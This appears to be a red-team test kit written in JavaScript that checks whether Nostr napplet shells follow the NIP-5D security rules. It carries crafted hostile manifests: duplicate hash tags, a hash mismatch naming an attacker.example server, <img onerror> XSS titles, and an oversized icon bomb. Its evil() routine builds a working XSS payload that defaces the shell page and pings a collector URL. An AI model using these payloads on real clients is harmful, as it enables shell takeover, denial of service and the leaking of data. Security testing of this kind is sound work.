// evil-04 — manifest & identity confusion (tier 2): the manifest event is
// attacker-authored input that DRIVES runtime decisions. The artifact probes
// what the runtime believed about IT; the kit carries crafted manifests for
// shell-side testing (multi-x, hash mismatch, XSS metadata, icon bombs).
window.__EVIL_KIT__ = [
  {
    label: 'multi-x ambiguity manifest',
    note: 'NIP-5D: "a manifest that does not carry exactly one x tag MUST be rejected." A runtime that takes the first (or last) x serves a DIFFERENT artifact than the one it verified.',
    data: {
      kind: 35129,
      content: 'A feed viewer and editor hosted on Nostr',
      tags: [
        ['d', 'my-napplet'],
        ['x', '186ea5fd14e88fd1ac49351759e7ab906fa94892002b60bf7f5a428f28ca1c99'],
        ['x', 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'],
        ['title', 'two x tags — which artifact is the napplet?'],
      ],
    },
  },
  {
    label: 'x-mismatch (TOCTOU bait) manifest',
    note: 'The x hash names a real artifact that is NOT this HTML — a runtime that verifies lazily, verifies once then re-fetches by src, or skips sha256(blob)==x loads something else.',
    data: {
      kind: 35129,
      content: 'harmless-looking description',
      tags: [
        ['d', 'my-napplet'],
        ['x', '0000000000000000000000000000000000000000000000000000000000000000'],
        ['server', 'https://attacker.example/blossom'],
      ],
    },
  },
  {
    label: 'launcher XSS metadata manifest',
    note: 'NIP-5D: content "MUST be treated as plain text, not HTML or Markdown." Render this title/content with innerHTML and the launcher (SHELL origin, no sandbox) executes the payload — full shell compromise.',
    data: {
      kind: 35129,
      content: 'harmless description <img src=x onerror="window.__evil04_kit_xss=1">',
      tags: [
        ['d', 'my-napplet'],
        ['x', '186ea5fd14e88fd1ac49351759e7ab906fa94892002b60bf7f5a428f28ca1c99'],
        ['title', '<img src=x onerror="document.title=\'PWNED\'">'],
      ],
    },
  },
  {
    label: 'icon bomb manifest',
    note: 'NIP-5D icon rules verify sha256 and decode, but cap neither pixel area nor allocation. A 65535×65535 PNG (declared image/png) is spec-legal and a shell-side memory DoS when the launcher renders it. Also probes runtimes that skip the format check (SVG re-labeled image/png).',
    data: {
      kind: 35129,
      content: 'icon decompression bomb carrier',
      tags: [
        ['d', 'my-napplet'],
        ['x', '186ea5fd14e88fd1ac49351759e7ab906fa94892002b60bf7f5a428f28ca1c99'],
        ['icon', 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', 'image/png'],
      ],
    },
  },
];

const ATTACKS = [
  {
    id: 'loaded-via-src',
    name: 'srcdoc vs src loading (TOCTOU)',
    target: '"Inject the verified bytes via srcdoc (never a navigated src)"',
    severity: 'critical',
    harm: 'A runtime that navigates the iframe to the Blossom/gateway URL re-fetches attacker-influenced bytes AFTER verification — serve one artifact to the verifier, another to the frame. Identity broken, everything after is untrusted.',
    async demo() {
      const href = safeGet(() => location.href);
      if (href === 'about:srcdoc') return blocked('location = about:srcdoc — the RUNNING bytes are the VERIFIED bytes (NIP-5D identity intact)');
      return armed('location = ' + mask(href, 48) + ' — loaded by src NAVIGATION, not srcdoc injection: bytes may be a re-fetch, not the verified artifact (TOCTOU open)');
    },
  },
  {
    id: 'runtime-injection',
    name: 'runtime namespace injection',
    target: '"Shells MUST inject window.napplet before any napplet script runs"',
    severity: 'high',
    harm: 'No injected namespace → the shell skipped pre-script injection (or mediates nothing) — unmediated napplets or races against napplet bootstrap.',
    async demo() {
      if (window.napplet && typeof window.napplet === 'object') {
        const domains = Object.keys(window.napplet);
        return na('injected namespace present, domains: ' + domains.join(', ') + ' — presence is shell policy; only the shell can verify timing (before first script)');
      }
      return na('no injected window.napplet namespace — a zero-domain shell is spec-legal; absence alone proves nothing. Presence/timing must be asserted shell-side');
    },
  },
  {
    id: 'sandbox-audit',
    name: 'sandbox grant audit',
    target: 'sandbox="allow-scripts" is the ONLY required token',
    severity: 'critical',
    harm: 'Any extra granted token (same-origin, popups, top-navigation) is a direct escape — this frame audits what it can reach.',
    async demo() {
      const issues = [];
      if (window.origin !== 'null') issues.push('real origin granted (' + window.origin + ')');
      try { localStorage.setItem('__evil04_audit__', '1'); localStorage.removeItem('__evil04_audit__'); issues.push('direct storage reachable'); } catch (_) { /* held: good */ }
      const w = window.open('about:blank');
      if (w) { try { w.close(); } catch (_) {} issues.push('popups permitted'); }
      return issues.length
        ? armed('out-of-spec capabilities granted: ' + issues.join('; ') + ' — NIP-5D allows only allow-scripts')
        : blocked('opaque origin, no direct storage, no popups — granted capabilities match NIP-5D exactly');
    },
  },
  {
    id: 'launcher-xss',
    name: 'launcher metadata XSS',
    target: '"Clients MUST treat it as plain text, not HTML or Markdown"',
    severity: 'critical',
    harm: 'Manifest title/content rendered as HTML in the launcher runs SCRIPT IN THE SHELL ORIGIN — no sandbox escape needed, the launcher hands over the shell. Full compromise.',
    evilBrief: 'Sends a manifest whose title is an <img onerror> payload. In an unsafe launcher (innerHTML) it executes in SHELL origin: writes the red "EVIL-04 XSS EXECUTED IN SHELL ORIGIN" banner into the shell DOM and pings the collector. Safe launchers render it inert.',
    async demo() {
      const id = 'evil04-xss-' + randId();
      postParent({
        type: 'evil.launcher.manifest', id: id,
        manifest: {
          title: '<img src=x onerror="window.frames[0] && window.frames[0].postMessage({type:\'evil04.xss.fired\',id:\'' + id + '\'},\'*\')">',
          content: 'evil-04 red-team launcher probe — harmless ping-back payload',
        },
      });
      const r = await waitForMsg(id, 2200);
      return r === 'timeout'
        ? blocked('no ping-back — launcher rendered the manifest metadata inertly as text (XSS channel closed)')
        : armed('XSS EXECUTED IN SHELL ORIGIN and reached back into this frame — the launcher innerHTML\'s attacker manifest data: full shell compromise');
    },
    async evil() {
      const banner = '__evil04_banner__';
      const payloadTitle = '<img src=x onerror="' +
        'var b=document.createElement(\'div\');b.id=\'' + banner + '\';' +
        'b.textContent=\'⚠ EVIL-04 XSS EXECUTED IN SHELL ORIGIN — manifest metadata XSS ' + new Date().toISOString() + '\';' +
        'b.style.cssText=\'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#b007;color:#fff;font:700 13px ui-monospace,monospace;padding:6px;text-align:center\';' +
        'document.body.appendChild(b);' +
        'fetch(\'' + state.collector + '?ev=evil04-launcher-xss\');' +
        '">';
      postParent({ type: 'evil.launcher.manifest', id: 'evil04-evil-' + randId(), manifest: { title: payloadTitle, content: 'evil-04 red-team payload' } });
      return { dispatched: 'launcher XSS manifest with shell-defacement + collector ping payload', collector: state.collector };
    },
  },
];